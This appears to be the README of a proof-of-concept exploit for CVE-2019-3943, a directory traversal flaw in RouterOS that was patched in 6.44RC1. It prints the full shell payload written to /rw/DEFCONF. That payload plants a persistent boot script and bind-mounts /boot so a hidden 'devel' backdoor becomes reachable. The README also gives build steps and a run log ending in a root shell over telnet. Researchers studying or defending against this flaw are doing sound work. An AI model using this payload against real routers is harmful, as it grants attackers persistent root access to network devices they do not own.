# CVE-2019-3943 DEFCONF Proof of Concept

This is an implementation of CVE-2019-3943 which is a directory traversal vulnerability affecting the fileman binary in Router OS. This vulnerability was patched in 6.44RC1. See Tenable's advisory at: https://www.tenable.com/security/research/tra-2019-16 

The PoC creates the file /rw/DEFCONF and then writes the following to it:

```
ok;
cp /rw/DEFCONF /rw/.lol;
mkdir -p /ram/pckg/lol/etc/rc.d/run.d/;
echo -e '#!/bin/bash\\n\\ncp /rw/.lol /rw/DEFCONF\\n' > /ram/pckg/lol/etc/rc.d/run.d/K92lol;
chmod 777 /ram/pckg/lol/etc/rc.d/run.d/K92lol;
mkdir /pckg/option;
mount -o bind /boot/ /pckg/option/
```

What does this do? After a reboot, it creates a persistent /pckg/option so that you can log in to the devel backdoor.

## What are the build dependencies?

This requires:

* Boost 1.66 or higher
* cmake

## How do I build this jawn?

Just normal cmake. Try this:

```sh
mkdir build
cd build
cmake ..
make
```

Resolve dependencies as needed.

## Usage

Against 6.42.12:

```sh
albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_defconf/build$ ./cve_2019_3493_defconf -i 192.168.1.24 -u admin
Success!
albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_defconf/build$ telnet -l devel 192.168.1.24
Trying 192.168.1.24...
Connected to 192.168.1.24.
Escape character is '^]'.
Password: 


BusyBox v1.00 (2019.02.08-10:41+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# 
```
